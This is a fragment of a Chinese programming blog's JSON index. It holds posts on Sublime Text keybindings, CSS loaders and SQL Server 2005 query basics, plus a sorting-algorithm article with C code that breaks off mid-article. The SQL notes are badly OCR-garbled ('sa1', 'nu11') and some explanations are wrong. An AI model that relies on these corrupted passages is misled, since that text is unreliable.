&quot;open_in_browser&quot; &#125;, &#123; &quot;keys&quot;: [&quot;f12&quot;], &quot;command&quot;: &quot;side_bar_files_open_with&quot;, &quot;args&quot;: &#123; &quot;paths&quot;: [], &quot;application&quot;: &quot;D:\\\\Program Files\\\\Mozilla Firefox\\\\firefox.exe&quot;, &quot;extensions&quot;:&quot;.*&quot; //any file with extension &#125; &#125;, &#123; &quot;keys&quot;: [&quot;ctrl+f12&quot;], &quot;command&quot;: &quot;side_bar_files_open_with&quot;, &quot;args&quot;: &#123; &quot;paths&quot;: [], &quot;application&quot;: &quot;C:\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe&quot;, &quot;extensions&quot;:&quot;.*&quot; //any file with extension &#125; &#125; ] 这样就可以用这三个键在浏览中预览页面了： F12 : Firefox alt + F12 : IE ctrl + F12 : chrome","categories":[{"name":"工欲善其事必先利其器","slug":"工欲善其事必先利其器","permalink":"https://ru23.com/categories/工欲善其事必先利其器/"}],"tags":[{"name":"sublime","slug":"sublime","permalink":"https://ru23.com/tags/sublime/"}]},{"title":"mysql笔记整理","slug":"2016-05-mysql笔记整理","date":"2016-05-26T10:32:12.000Z","updated":"2018-10-24T03:46:01.655Z","comments":true,"path":"note/dd0ba9ab.html","link":"","permalink":"https://ru23.com/note/dd0ba9ab.html","excerpt":"","text":"mysql学习笔记整理","categories":[{"name":"DataBase","slug":"DataBase","permalink":"https://ru23.com/categories/DataBase/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://ru23.com/tags/Mysql/"}]},{"title":"mysql复习秘籍","slug":"2016-05-mysql复习秘籍","date":"2016-05-25T02:26:48.000Z","updated":"2018-10-24T03:46:01.653Z","comments":true,"path":"note/46c8cf15.html","link":"","permalink":"https://ru23.com/note/46c8cf15.html","excerpt":"","text":"Mysql复习重要资料","categories":[{"name":"DataBase","slug":"DataBase","permalink":"https://ru23.com/categories/DataBase/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://ru23.com/tags/Mysql/"}]},{"title":"HTML5+CSS3 最酷的 loading 效果收集","slug":"2016-05-HTML5-CSS3-最酷的-loading-效果收集","date":"2016-05-20T01:11:44.000Z","updated":"2018-10-24T03:46:01.651Z","comments":true,"path":"note/a5d30e83.html","link":"","permalink":"https://ru23.com/note/a5d30e83.html","excerpt":"这里收集了几十个用 html5 和 css3 实现的 loading 效果，以供学习参考","text":"这里收集了几十个用 html5 和 css3 实现的 loading 效果，以供学习参考 01. CSS Rainbow Loader 演示 下载 02. Single element Slack loader 演示 下载 03. Pure CSS3 loader 演示 下载 04. CSS Cog loader 演示 下载 05. VSCO – CSS loader 演示 下载 06. Cube CSS Loader 演示 下载 07. CSS Loader 演示 下载 08. Tumblr-style cog loaders 演示 下载 09. CSS Weather Loader 演示 下载 10. Chrome Cast CSS Loader 演示 下载 11. CSS3 Loaders 演示 下载 12. Android 4.4 Kitkat loader 演示 下载 13. CSS loaders kit 演示 下载 14. CSS creative loading 演示 下载 15. CSS Loading Animation 演示 下载 16. Logo Loader 演示 下载 17. Loaders collection by Loaders.css 演示 下载 18. CSS Water filling Loader 演示 下载 19. CSS loader 演示 下载 20. Animated CSS3 Loading Bar 演示 下载 21. CSS loading text animation 演示 下载 22. Simple Loader 演示 下载 23. CSS Loading animation 演示 下载 24. CSS loader 演示 下载 25. Pushing pixels CSS loader 演示 下载 26. CSS Loader 演示 下载 27. CSS Loaders 演示 下载 ###28. Random Loader 演示 下载 29. Single element CSS spinners 演示 下载 30. Simple CSS loader 演示 下载 31. SpinKit – CSS loaders 演示 下载 32. Modern Google Loader 演示 下载 33. 2D and 3D Block Loaders 演示 下载 34. 12 free SVG loaders 演示 下载 35. Page Loading Effects 演示 下载 36. Pace.js – Page Load Progress Bars 演示 下载 37. Loading SVG loaders 演示 下载 38. Material Design preloader 演示 下载 93: https://github.com/tobiasahlin/SpinKit 92: http://tobiasahlin.com/spinkit/ 111: https://github.com/jxnblk/loading[110]: http://jxnblk.com/loading/","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"HTML5","slug":"HTML5","permalink":"https://ru23.com/tags/HTML5/"}]},{"title":"SqlServer2005学习总结","slug":"2016-05-SqlServer2005学习总结","date":"2016-05-17T09:42:17.000Z","updated":"2018-10-24T03:46:01.657Z","comments":true,"path":"note/2c26a818.html","link":"","permalink":"https://ru23.com/note/2c26a818.html","excerpt":"第一部分：数据库相关概念什么是数据库","text":"第一部分：数据库相关概念什么是数据库 狭义: 存情数据的仓库 广义: 可以对数据进行存储和管理的软件以及数据本身统称为数据库 数据库是由表、 关系、 操作组成 为什么需要数据库 几乎所有的应用软件的后台都需要数据库 数据库存储数据占用空间小容易持久保存 存储比较安全 容易维护和升级 数据库移植比较容易 简化对数据的操作 为将来学习0racle做准备 B/s架构里面包含数据库数据库的安装和卸载 sq12000 解决挂起的问题 预备知识 学习SqlServer2005必须的先学一门编程语言么 不需要,但是懂一门编程语言的话会有助于学习sqlserver2005 的TL SQ 数据结构和数据库的区别 数据库是在应用软件级别研究数据的存储和操作数据结构是在系统软件级别研究数据的存储和操作 什么是连接 【重点】 有了编程语言为什么还需要数据库 对内存数据操作是编程语言的强项, 但是对硬盘数据操作却是编程语言的弱项对硬盘数据操作是数据库的强项, 是数据库研究的核心同题 建议初学者从三个方面学习数据库数据库是如何存储数据的 字段记录表约束(主键外键唯一键非空 check default触发器) 数据库是如何操作数据的insert update delete T-SQL 存储过程函数触发器 数据库是如何显示数据的select(重点的重点) 必各的一些操作 如何建数据库 如何删除数据库 如何附加和分高数据库 设置登录用户名和密码 如何创建用户 数据库是如何解决数据存储问题的 【最基础内容, 必须掌握】 1.表的相关数据 字段 一个事物的某一个特征 记录 字段的组合表示的是一个具体的事物 表 记录的组合表示的是同一类型事物的集合 表和字段、记录的关系 字段是事物的属性 记录是事物本身 表是事物的集合 列 字段的另一种称谓 属性 字段的另一种称谓 元组 记录的另一种称谓 2. create table命令 通过图形化界面建表create table最后一个字段的后面建议不要写逗号说明:简単掌握后面我们会再详细的介绍 3. 什么是约束 定义 对一个表中属性操作的限制叫做约束 分类 主键约束不允许重复元素選免了数据的冗余 外键约束 通过外键约束从语法上保证了本事物所 关联的其他事物一定是存在的 事物和事物之间的关系是通过外键来体现的 check约束 保证事物属性的取值在合法的范围之内 default约束 保证事物的属性一定会有一个值 唯一约束 保证了事物属性的取值不允许重复,,但允许其中有一列且只能有一列为空 间题: ul,i que键是否允许多列为空? 答: SqlServer2005只允许一个uni que列为空 Oracle1 IG允许多个uni que列为空 not null 要求用户必须的为该属性赋一个值,否则语法出错! 如果一个字段不写n,11也不行not n,11 则默认是rm11即默认允许为空,用户可以不给该字段赋值 如果用户没有为该字段赋值,则该字段的值默认是nd1 要注意nu11和 default的区别 相同点: 都允许用户不赋值 不同点: nu11修饰的字段如果用户不赋值则默认是nu1 1 default修饰的字段如果用户不赋値则默认是default指定的那个值 4. 表和约束的异同 数据库是通过表来解决事物的存備同题的 数据库是通过约束来解决事物取值的有效性和合法性的问题 建表的过程就是指定事物属性及其事物属性各种约束的过程 什么是关系 定义:表和表之间的联系 实现方式 通过设置不同形式的外键来体现表和表的不同关系 分类(假设是A表和B表) 一对一既可以把表A 的主键充当表B的外键也可以把表B的主键充当表A的外键 一对多【重点】把表A 的主键充当表B的外键或者讲: 把A表的主键添加到B表来充当B表的外键 在多的一方添加外键 多对多多对多必须的通过単独的一张表来表示 例子 班级和教师 班级是一张表 教师是一张表 班级和教师的关系也是一张表 6. 主键 定义 能够唯一标示一个事物的一个字段或者多个字段的组合, 被称为主键 主键的特点【重点】: 含有主键的表叫做主键表 主键通常都是整数不建议使用字符串当主體(如果主體是用于集群式服务,才可以考虑用字符串当主體) 主键的值通常都不允许修改, 除非本记录被删除 主键不要定义成i d, 而要定义成表名 Id或者表名_i d 要用代理主键,不要用业务主键 任何一张表, 强烈建议不要使用有业务含义的字段充当主键 我们通常都是在表中単独添加一个整型的编号充当主键字段 主键是否连续增长不是十分重要 7. 外键 定义: 如果一个表中的若干个字段是来自另外若干个表的主键或唯一键则这若干个字段就是外键 注意: 外键通常是来自另外表的主键而不是唯一键, 因为唯一键可能为M11 外键不一定是来自另外的表, 也可能来自本表的主键 含有外键的表叫外建表, 外键字段来自的那一张表叫做主键表 问题: 先删主键表还是外建表? 答集: 先删外建表如果先删主键表,会报错,因为这会导致外建表中的数据引用失败 第二部分：查询査询【最重要难度最大,考试必考内容,强烈建议所有的学生都要熟练掌握査询的内容】 1.计算列 from emp;```12345- -- *表示所有的- -- from emp 表示从emp表査询```select empno, ename from emp ename, sa1 from emp;```1234567- select ename, sa1*12 as″年薪″ from emp;- --as可以省略记住:″年薪″不要写成&apos;年薪&apos;也不要写成年薪- select ename, sa1*12 as″年薪″, sa1″月薪″, job from emp;```select888 from emp; –ok-一输出的行数是emp表的行数 每行只有一个字段, select5; –ok-一不推荐 注意: 在0racle中字段的别名不允许用单引号括起来 但是sqlserver2005却允许,,因此为了兼容性 -最好字段别名用双引号括起来, 不要用单引号 2. distinct【不允许重复的】 distinct deptno from emp;```1```--distince deptno会过滤掉重复的deptno distinct comm from emp;```123456789--distinct也可以过滤掉重复的nu11 或者说如果有多个nu11只输出一个```select distinct comm, deptno from emp;```-一把comm和deptno的组合进行过滤```select deptno, distinct comn from emp1```--error逻辑上有冲突**3. between【在某个范围】**- -一査找工资在1 500到3000之间(包括和)的所有的员工的信息```select* from e1lIpwhere sa1&gt;=1500 and sa1&lt;=3000 等价于from emp1where sa1 between1500 and3000 -一査找工资小于3ooo或大于1 5oo的所有的员工的信息from emp where sa13000```12等价于```select* from emp where sa1 not between1500 and3000 4. in【属于若干个弧立的值】 select*from emp where sa1 in(1500, 3000, 5000)123等价于```select* from empwhere sa1=1500 or sa1=3000 or sa1=5000 emp where salnot in(1500, 3000, 5000)``` 12345- -一把sa1既不是也不是也不是的记录输出等价于```select* from enpwhere sa1〇1500 and sat〇3000 and sat〇5000 -一数据库中不等于有两种表示: != &lt;&gt; 推荐使用第二种 -一对或取反是并且对并且取反是或 5. top【最前面的若干个记录专属于sqlserver的语法,不可移植到其他数据库】 top5 *from emp;```123456789101112131415161718192021222324252627``select top15 percent* from emp; ``` -一输出的是3个,不是2个``select top5 from emp;``` --error**6. nu11【没有值空值】**- 零和rm11是不一样的, nu11表示空值,投有值,零表示一个确定的值- nu11不能参与如下运算: 〇 != =- n111可以参与如下运算: is not is- select* from emp where comm is nu11; -一输出奖金为空的员工的信息```select* from emp where comm is not nu11;``` - 一输出奖金不为空的员工的信息```select* from e叩 where comm 〇 null; ```-一输出为空error```select*from emp where comm !=nu11; ```-一输出为空error```select* from emp where comm = nu11; ``` -一输出为空error- 任何类型的数据都允许为 nu1 1```create table t1 (:l,lamenvarchar(20), cnt int, riqi datetime);insert into t1 values(nu1l, nu11, nu11);``` -0K- 任何数字与rm1 1参与数学运算的结果永远是nu1 1- 一输出每个员工的姓名年薪(包含了奖金) comn假设是一年的奖金```select empno, ename, sa1*12+comm ″年薪&quot; from emp; -一本程序证明了: r,u11不能参与任何数据运算否则结果永远为空 一正确的写法是: ename, sa1*12+isnu11(comm, 0)″年薪″ from emp;```123456789101112131415161718192021222324252627282930313233--is null(comm, 0)如果comm是nu11就返回零否则返回comm的值**7. order by 【以某个字段排序】**- `order by a, b` --a和b都是升序- `order by a, b desc` --a升序 b降序- `order by a desc, b` -a降序 b升序- `order by a desc, b desc` --a和b都是降序- 文字描述: - 如果不指定排序的标准,则默认是升序升序用asc表示默认可以不写 - 为一个字段指定的排序标准并不会对另一个字段产生影响强烈建议为每一个字段都指定排序的标准**例子:** - asc是升序的意思默认可以不写 desc是降序`select* from emp order by sa1;` 一默认是按照升序排序 select*from emp order by deptno, sa1;- -一先按照deptno升序排序,如果deptno相同,再按照sa1升序排序 select* from emp order by deptno desc, sa1;- -一先按deptno降序排序如果deptno相同再按照sal升序排序- -一记住sa1是升序不是降序`--orderby a desc, b, c, d` desc只对a产生影响不会对后面的b c d产生影响```select*from emp order by deptno, sa1 desc -一问题: desc是否会对deptno产生影响? -一答案:不会 -一先按deptno升序,如果deptno相同,再按sa1降序 8.模糊査询 【搜索时经常使用】 格式:select字段的集合 from表名 where某个字段的名字1ike匹配的条件匹配的条件通常含有通配符 通配符:%表示任意o个或多个字符 emp where enamelike'%A%' ``` 123456- --ename只要含有字母A就输出```select*from emp where enamelike&apos;A%&apos; ``` - -ename只要首字母是A的就输出```select* from emp where enamelike&apos;%A&apos; -ename只要尾字母是A的就输出 [这是下划线不是減号] 表示任意单个字符 from emp where enamelike'_A%'```12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758- -ename只要第二个字母是A的就输出**[a-f]**- a到f中的任意单个字符只能是a b c d e f中的任意一个字符`select* from emp where` - `enamelike&apos;_[A-F]%&apos;&apos;&apos;`-一把ename中第二个字符是A或B或c或D或E或F的记录输出**[a, f]**- a或f**[a-c]**- 不是a也不是b也不是c的任意单个字符`select* from emp where enamelike&apos;_[A-F]%&apos;&apos;&apos;`-一把ename中第二个字符不是A也不是B也不是c也不是D也不是E也不是F的记录输出**注意:**- 匹配的条件必须的用单引号括起来 不能省略也不能改用双引号通配符作为不同字符使用的同题```select* from student where namelike&apos;%\\%%&apos; escape&apos;\\&apos; ``` -一把name中包含有%的输出```select* from student where namelike&apos;%\\_%&apos; escape&apos;\\&apos;``` 一把name中包含有_的输出**9.聚合函数【多行记录返回至一个值通常用于统计分组的信息】函数的分类**- 単行函数 - 每一行返回一个值- 多行函数 - 多行返回一个值 - 聚合函数是多行函数 **例子:**```selectlower(ename) from emp;``` 一最终返回的是行1ower0是单行函数`select max(sa1) from emp;` 一返回行max0是多行函数**聚合函数的分类**- max()-min()-avg() 平均值-count()求个数-count(*)返回表中所有的记录的个数`select count(*) from emp;` -一返回emp表所有记录的个数count(字段名)- 返回字段值非空的记录的个数, 重复的记录也会被当做有效的记录```select courlt(deptno) from emp; -一返回值是这说明deptno重复的记录也被当做有效的记录 coul,it(l1omm) from emp;``1234567- -一返回値是这说明 c omm为ru」1 1的记录不会被当做有效的记录- count(distinct字段名) - 返回字段不重复并且非空的记录的个数```select count(distinct deptno) from emp; -一返回值是 统计deptno不重复的记录的个数 注意的问题 判断如下sq1语句是否正确 ma:x(sa1), min(sa1), count(*) from emp; ```--ok12345678910111213141516select max(sa1) -最高工资″, min(sa1)″最低工资″, count(*)″员工人数″ from emp; --ok```select max(sa1), 1ower(ename) from emp;``` --error单行函数和多行函数不能混用```select ma;x(sa1) from emp;``` --ok默认把所有的信息当做一组**10. group by 【分组难点】**- 格式: - group by字段的集合- 功能: - 把表中的记录按照字段分成不同的组**例子**- 査询不同部门的平均工资```select deptno, avg(sa1) as″部门平均工资⊠ from emp group by deptno 注意: 理解: gro·up by a, b, c的用法 先按a分组,如果a相同,再按b分组,如果b相同,再按c分组 最终统计的是最小分组的信息 一定要明自下列语句为什么是错误的 select deptno, avg(sa1) as″部门平均工资⊠, enamefrom emp解oup by deptno select deptno, enamefrom emp解oup by deptno select deptno, job, sa1from emp解oup by deptno, job记住:使用了gro1」p by之后select 不能出现组内的详细信息中只能出现分组后的整体信息, 11. having【对分组之后的信息进行过滤难点】 having子句是用来对分组之后的数据进行过滤因此使用having时通常都会先使用group by 如果没使用gro·L!p by但使用了having则意味着having把所有的记录当做一组来进行过滤极少用 count(*)12from emphaving avg(sa1) &gt; 1000 having子句出现的字段必须的是分组之后的组的整体信息having子句不允许出现组内的详细信息 尽管select字段中可以出现别名 但是having子句中不能出现字段的别名, 只能使用字段最原始的名字原因不得而知 having和where的异同 相同的: 都是对数据过滤,只保留有效的数据where和having一样, 都不允许出现字段的别名,,只允许出现最原始的字段的名字,本结论在S‘11Server2005和Olracle11G都成立 不同: where是对原始的记录过滤 having是对分组之后的记录过滤 where必须的写在having的前面,顺序不可颠倒否则运行出错 例子: 一把工资大于,-一统计输出部门平均工资大于的部门的部门编号部门的平均工资select deptno, avg(sa1)″平均工资″, count(*)″部门人数″,,max(sa1) ″部门的最高工资″from empwhere sa1 &gt;2000 –where是对原始的记录过滤group by deptnohaving avg(sa1) &gt; 3000 -一对分组之后的记录过滤 一判断入选语句是否正确 select deptno, avg(sal)″平均工资″, count(*)″部门人数″,,max(sa1) ″部门的最高工资″ fromemp group by deptno having avg(sa1) &gt;3000 -一对分组之后的记录过滤 where sa1 &gt;2000 一一where写在了having的后面 error 12.连接査询 定义 将两个表或者两个以上的表以一定的连接条件连接起来 从中检索出满足条件的数据 分类 内连接【重点的重点也是难点的难点】 select... fromA, B的用法产生的结果: 行数是A和B的乘积 列数是A和B之和 或者说油表的每一条记录都和B表的每一条记录组合在一起形成的是个笛卡尔积 或者说: 把B表的每一条记录都和A表的每一条记录组合在一起形成的是个笛卡尔积 注意: from A, B```12输出结果和```select* from B, A 是一模一样的 例子-一输出70行11列from emp, dept```1234567891011121314**2. select... from A, Bwhere... 的用法**```select... from A, B ``` --A和B可以互换产生的簡卡尔积, 用where中的条件进行过滤**例子:**-一输出5行11列select*from emp, dept --dept和emp互换输出结果不变where empno= 7369- select... from A join B on... select... from A join B on- SQL92标准和 SQL99标准的区别```select... from A, B where. from A join B on```12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182输出结果是一样**推荐使用 sQL99标准**- sq199更容易理解- 在sq199标准中, on和,rhere可以做不同的分工on指定连接条件where对连接之后临时表的数据进行过糖**示例:**一把工资大于2000的员工的姓名和部门的名称输出 和 工资的等级-sc1199标准明显的优于sq192 select″E″.enae,″D″.hme,″S&quot;.grade from e叩 &quot;E″ join dept″D″ on″E″.deptno=″D〟.deptno Join salgrade″S″ on″E″.sa1&gt;=″S″.1osal md&quot;E″.sa1 &lt;=″S″.hisal where″E&quot;.sa1 &gt; 2000一把工资大于2ooo的员工的姓名和部门的名称输出 和 工资的等级-sq192标准 select″E″.en訓e,″D″.如ae,″S″.grade from e叩 ″E″, dept&quot;D〟, salpade″S″ where″E&quot;,sa1 &gt; 2000 md &quot;E″,deptno=″D″,deptno md (″E″.sa1&gt;=″S″.1osa1 md -E″.sa1 &lt;=″S″.hisa1)**5. select、 from、 where、 Join、 on、 group、 order、 top、 having的混合使用****査询的顺序**- select top....- from A- join B- on....- join C- on....- where,.....- group by...- having. , , . .- order by.....**例子:**- -一把工资大于的所有的员工按部门分组把部门平均工资大于的最- -一高前个的部门的编号部门的名称部 「J平均工资的等级- **一第一种写法**&gt; select&quot;T″,*, &quot;D″,如ae, &quot;S″.grade&gt; from dept″D″&gt; join(select top2″E&quot;.deptno, avg(sa1)″avg_sa1″&gt; from emp″E″&gt; join dept″D″&gt; on″E″.deptno=″D&quot;.deptno&gt; Join salpade″S&quot;&gt; on -E″.sa1 between〃S&quot;.1osa1 nd″S&quot;.hisa1&gt; where ⊠E&quot;.sa1 &gt; 1500&gt; group by ⊠E″.deptno&gt; having avg(″E〟.sat) &gt; 2000&gt; order by avg(&quot;E&quot;.sat) desc&gt; ) ″T″&gt; on&quot;D〟.deptno=″T″.deptno&gt; imer join salgrade″S&quot;&gt; on″T&quot;.″avg_sa1&quot; between&quot;S″.1osa1 nd&quot;S″.hisa1- **一第二种写法**&gt; select″T-.*, ″D-. hae, ″S&quot;.grade from dept″D″ join(select top2&gt; deptno, avg(sa1) as″avg_sa1″ from emp where sa1 &gt; 1500 group by&gt; deptno having avg(sa1) &gt; 2000 order by″avg_sa1″ desc ) ″T″&gt; on″D″.deptno=″T″.deptno Join salgrade″S&quot; on″T&quot;.″avg_sa1″&gt; between″S″.1osa1 nd″S″,hisal**6. 习题**- 判断以下语句输出是几行```select&apos;l: from emp, dept where emp.deptno= 10 from emp, dept where dept.deptno1234567891011121314151617181920212223242526272829303132333435363738394041- -一过滤条件不是连接条件考虑如何把selelit:* from emp, dept where dept.dept:lio= 10 以sq199标准来输出1&gt;求出每个员工的姓名部门编号薪水和薪水的等级2&gt;査找每个部门的编号该部门所有员工的平均工资平均工资的等级3&gt;査找每个部门的编号部门名称该部门所有员工的平均工资平均工资的等级4&gt;求出emp表中所有领导的信息5&gt; 求出平均薪水最高的部门的编号和部门的平均工资6&gt;把工资大于所有员工中工资最低的前3个人的姓名工资部门编号部门名称工资等级输出**自连接**- 定义 - 一张表自己和自己连接起来査询数据 **例子** - 不准用聚合函数求薪水最高的员工的信息**联合**- 定义 - 表和表之间的数据以纵向的方式连接在一起 - **注意:** 我们以前讲的所有的连接是以横向的方式连接在一起的**例子:**- 输出每个员工的姓名工资上司的姓名```select&quot;E1″,enae,″E1″.sa1, ″E2″.en訓e″上司的姓名″from emp″E1″Join emp″磁″on&quot;E1&quot;.m解 =″E2″.empnouni onselect ename, sa1, &apos;已是最大老板&apos; from emp where mgr is nul1 注意: 若干个select子句要联合成功的话,必须的满足两个条件 这若干个select子句输出的列数必须是相等的 这若干个se1 ect子句输出列的数据类型至少是兼容的 identity【主键自动增长,用户不需要为identity修饰的主键赋值】用户如何手动给被i dent i ty修饰的主键赋值不重要 表中删除数据后又插入数据会导致主键不连续递增 怎么办?主键是否连续增长不十分重要 视图 为什么需要视图 示例 求出平均工资最高的部门的编号和部门的平均工资 总结: 简化査询 避免了代码的冗余 避免了书写大量重复的sq1语句 什么是视图 视图从代码上看是一个select语句 视图从逻辑上看被当做一个虚拟表看待 如何创建视图 create view视图的名字as-se1 ect的前面不能添加beginselect语句-se1 ect的后面不能添加end 注意的问题 创建视图的 se1 ec t语句必须的为所有的计算列指定别名-errorcreate view v$_aasselect avg(sa1) from emp; -okcreate view v$_a asselect avg(sa1) as ⊠avg_sa1″ from emp; 视图不是物理表,是虚拟表 不建议通过视图更新视图所依附的原始表的数据或结构 视图的优点 简化査询 增加数据的保密性 视图的缺点 增加了数据库维护的成本 视图只是简化了査询,但是并不能加快査询的速度这也是视图使用不足的地方 事务【重要】 初学者必须要理解的三个概念 事务是用来研究什么的 避免数据处于不合理的中间状态 转账 怎样保证多用户同时访间同一个数据时呈现给用户的数据是合理的很复杂,现在人类仍然投有设计出很好的解决办法! 事务和线程的关系 事务是通过锁来解决并发访问的 线程同步也是通过锁来解决并发访同的 synchronized 所谓并发访同是指: 多用户同时访同同一个数据 事务和第三方插件的关系 直接使用事务库技术难度很大 很多人是借助第三放插件来实现 因此我们一般人不需要细细的研究数据库中事务的语法细节 第三方插件要想完成预期的功能, 一般必须的借助数据库中的事物机制来实现 索引 存储过程游标 TL_SQL 触发器 分页査询 总结 假设每页显示n条记录, 当前要显示的是第m页表名是A 主键是A_idselect top nfrom Awhere A_id not in(select top (m-1)n A_id from emp)","categories":[{"name":"DataBase","slug":"DataBase","permalink":"https://ru23.com/categories/DataBase/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://ru23.com/tags/sql/"}]},{"title":"7种常用的排序算法总结","slug":"2016-04-排序算法总结","date":"2016-04-30T06:04:54.000Z","updated":"2018-10-24T03:46:01.649Z","comments":true,"path":"note/e5990f4c.html","link":"","permalink":"https://ru23.com/note/e5990f4c.html","excerpt":"排序算法：一种能将一串数据依照特定的排序方式进行排列的一种算法。排序算法性能：取决于时间和空间复杂度，其次还得考虑稳定性，及其适应的场景。稳定性：让原本有相等键值的记录维持相对次序。也就是若一个排序算法是稳定的，当有俩个相等键值的记录R和S，且原本的序列中R在S前，那么排序后的列表中R应该也在S之前。","text":"排序算法：一种能将一串数据依照特定的排序方式进行排列的一种算法。排序算法性能：取决于时间和空间复杂度，其次还得考虑稳定性，及其适应的场景。稳定性：让原本有相等键值的记录维持相对次序。也就是若一个排序算法是稳定的，当有俩个相等键值的记录R和S，且原本的序列中R在S前，那么排序后的列表中R应该也在S之前。 1-冒泡排序原理俩俩比较相邻记录的排序码，若发生逆序，则交换；有俩种方式进行冒泡，一种是先把小的冒泡到前边去，另一种是把大的元素冒泡到后边。冒泡法大家都较熟悉。其原理为从a[0]开始，依次将其和后面的元素比较,若a[0]&gt;a[i]，则交换它们，一直比较到a[n]。同理对a1,a2,…a[n-1]处理，即完成排序 冒泡排序的基本概念： 依次比较相邻的两个数，将小数放在前面，大数放在后面。即在第一趟：首先比较第1个和第2个数，将小数放前，大数放后。然后比较第2个数和第3个数，将小数放前，大数放后，如此继续，直至比较最后两个数，将小数放前，大数放后。至此第一趟结束，将最大的数放到了最后。在第二趟：仍从第一对数开始比较（因为可能由于第2个数和第3个数的交换，使得第1个数不再小于第2个数），将小数放前，大数放后，一直比较到倒数第二个数（倒数第一的位置上已经是最大的），第二趟结束，在倒数第二的位置上得到一个新的最大数（其实在整个数列中是第二大的数）。如此下去，重复以上过程，直至最终完成排序。由于在排序过程中总是小数往前放，大数往后放，相当于气泡往上升，所以称作冒泡排序。 实现： 外循环变量设为i，内循环变量设为j。假如有10个数需要进行排序，则外循环重复9次，内循环依次重复9，8，…，1次。每次进行比较的两个元素都是与内循环j有关的，它们可以分别用a[j]和a[j+1]标识，i的值依次为1,2,…,9，对于每一个i,j的值依次为1,2,…10-i。 图示： 性能时间复杂度为O(N^2)，空间复杂度为O(1)。排序是稳定的，排序比较次数与初始序列无关，但交换次数与初始序列有关。 优化若初始序列就是排序好的，对于冒泡排序仍然还要比较O(N^2)次，但无交换次数。可根据这个进行优化，设置一个flag，当在一趟序列中没有发生交换，则该序列已排序好，但优化后排序的时间复杂度没有发生量级的改变 代码 12345678910111213141516171819202122232425262728293031#include&lt;stdio.h&gt;void sort(int *a,int len)&#123; int i,j,t; for( i = 0;i&lt;len-1;++i) &#123; for(j = 0;j&lt;len-1-i;++j) 或者 j=i+1;j&lt;len;++j &#123; if(a[j] &gt;a[j+1]) &#123; t = a[j]; a[j] = a[j+1]; a[j+1] = t; &#125; &#125; &#125; &#125;void main()&#123; int a[6] = &#123;10,2,8,-8,11,0&#125;; int i = 0; sort(a,6); for(i = 0; i&lt;6;++i) &#123; printf(&quot;%d &quot;,a[i]); &#125; printf(&quot;\\n&quot;);&#125; 冒泡法原理简单，但其缺点是交换次数多，效率低。下面介绍一种源自冒泡法但更有效率的方法“选择法”。 2-选择排序原理每次从未排序的序列中找到最小值，记录并最后存放到已排序序列的末尾.选择法循环过程与冒泡法一致，它还定义了记号k=i,然后依次把a[k]同后面元素比较，若a[k]&gt;a[j],则使k=j.最后看看k=i是否还成立，不成立则交换a[k],a[i],这样就比冒泡法省下许多无用的交换，提高了效率。 性能时间复杂度为O(N^2)，空间复杂度为O(1)，排序是不稳定的（把最小值交换到已排序的末尾导致的），每次都能确定一个元素所在的最终位置，比较次数与初始序列无关。 代码1234567891011121314151617181920212223242526272829303132333435//直接选择排序#include&lt;stdio.h&gt;void sort(int *a,int len)&#123; int i,j,min,t; for(i = 0;i&lt;len-1;++i) &#123; for(min=i,j=i+1;j&lt;len;++j) &#123; if(a[min]&gt;a[j]) min = j; &#125; if(min!=i) &#123; t = a[i]; a[i] = a[min]; a[min] = t; &#125; &#125;&#125;void main()&#123; int a[6] = &#123;4,0,3,2,5,1&#125;; sort(a,6);//a代表数组的首地址 for(int i=0;i&lt;6;++i) printf(&quot;%d\\n&quot;,a[i]);&#125; 选择法比冒泡法效率更高，但说到高效率，非“快速法”莫属，现在就让我们来了解它。 3-快速排序原理基本思想： 快速排序是对冒泡排序的一种改进。由C. A. R. Hoare在1962年提出。它的基本思想是：通过一趟排序将要排序的数据分割成独立的两部分，其中一部分的所有数据都比另外一部分的所有数据都要小，然后再按此方法对这两部分数据分别进行快速排序，整个排序过程可以递归进行，以此达到整个数据变成有序序列。 实现：设要排序的数组是A[0]……A[N-1]，首先任意选取一个数据（通常选用第一个数据）作为关键数据，然后将所有比它小的数都放到它前面，所有比它大的数都放到它后面，这个过程称为一趟快速排序。值得注意的是，快速排序不是一种稳定的排序算法，也就是说，多个相同的值的相对位置也许会在算法结束时产生变动。 一趟快速排序的算法是：1）设置两个变量i、j，排序开始的时候：i=0，j=N-1；2）以第一个数组元素作为关键数据，赋值给key，即 key=A[0]；3）从j开始向前搜索，即由后开始向前搜索（j – ），找到第一个小于key的值A[j]，A[i]与A[j]交换；4）从i开始向后搜索，即由前开始向后搜索（i ++ ），找到第一个大于key的A[i]，A[i]与A[j]交换；5）重复第3、4、5步，直到 I=J； (3,4步是在程序中没找到时候j=j-1，i=i+1，直至找到为止。找到并交换的时候i， j指针位置不变。另外当i=j这过程一定正好是i+或j-完成的最后令循环结束。） 图示： 举例说明： 如无序数组[6 2 4 1 5 9] a),先把第一项[6]取出来, 用[6]依次与其余项进行比较, 如果比[6]小就放[6]前边,2 4 1 5都比[6]小,所以全部放到[6]前边 如果比[6]大就放[6]后边,9比[6]大,放到[6]后边,//6出列后大喝一声,比我小的站前边,比我大的站后边,行动吧!霸气十足~ 一趟排完后变成下边这样: 排序前 6 2 4 1 5 9 排序后 2 4 1 5 6 9 b),对前半拉[2 4 1 5]继续进行快速排序 重复步骤a)后变成下边这样: 排序前 2 4 1 5 排序后 1 2 4 5 前半拉排序完成,总的排序也完成: 排序前:[6 2 4 1 5 9] 排序后:[1 2 4 5 6 9] 性能快排的平均时间复杂度为O(NlogN），空间复杂度为O(logN)，但最坏情况下，时间复杂度为O(N^2)，空间复杂度为O(N)；且排序是不稳定的，但每次都能确定一个元素所在序列中的最终位置，复杂度与初始序列有关。 优化当初始序列是非递减序列时，快排性能下降到最坏情况，主要因为基准每次都是从最左边取得，这时每次只能排好一个元素。所以快排的优化思路如下： 优化基准，不每次都从左边取，可以进行三路划分，分别取最左边，中间和最右边的中间值，再交换到最左边进行排序；或者进行随机取得待排序数组中的某一个元素，再交换到最左边，进行排序。在规模较小情况下，采用直接插入排序代码 